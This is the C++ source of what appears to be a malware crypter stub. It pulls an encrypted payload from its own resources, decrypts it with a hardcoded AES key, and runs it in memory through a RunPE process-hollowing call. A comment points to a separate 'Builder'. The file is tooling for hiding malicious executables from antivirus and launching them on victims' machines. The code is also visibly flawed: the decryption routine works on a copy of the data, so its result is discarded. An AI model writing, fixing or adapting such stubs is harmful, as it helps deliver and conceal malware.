#include <iostream>
#include <Windows.h>
#include <fstream>
#include "Runpe.h"
#include <vector>
#include <string>
#include "Header.h"
using namespace std;


int Rsize;


std::vector<char> RData;

void Resource(int id)
{
	size_t Rsize;
	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
	HGLOBAL temp = LoadResource(NULL, hResource);
	Rsize = SizeofResource(NULL, hResource);
	RData.resize(Rsize);
	memcpy((void*)RData.data(), temp, Rsize);  // replace &RData[0] with RData.data() if C++11
}


void AESDecrypt(std::vector<char> toDecrypt, int size)
{
	//Explanation exist in Builder
	unsigned char key[KEY_256] = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";

	unsigned char ciphertext[BLOCK_SIZE];
	unsigned char decrypted[BLOCK_SIZE];

	aes_ctx_t* ctx;
	virtualAES::initialize();
	ctx = virtualAES::allocatectx(key, sizeof(key));

	int count = 0;
	int index = size / 16;
	int innerCount = 0;
	int innerIndex = 16;
	int dataCount = 0;
	int copyCount = 0;
	for (count; count < index; count++)
	{
		for (innerCount = 0; innerCount < innerIndex; innerCount++)
		{
			ciphertext[innerCount] = toDecrypt[dataCount];
			dataCount++;
		}

		virtualAES::decrypt(ctx, ciphertext, decrypted);

		for (innerCount = 0; innerCount < innerIndex; innerCount++)
		{
			toDecrypt[copyCount] = decrypted[innerCount];
			copyCount++;
		}
	}

	delete ctx;
}

void enc()
{
	AESDecrypt(RData, RData.size());
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	Resource(10);
	enc();

	LPVOID pFile;
	TCHAR szFilePath[1024];

	pFile = RData.data();
	if (pFile)
	{
		GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
		NTRX_RUNPE32(pFile);
	}
	return 0;
};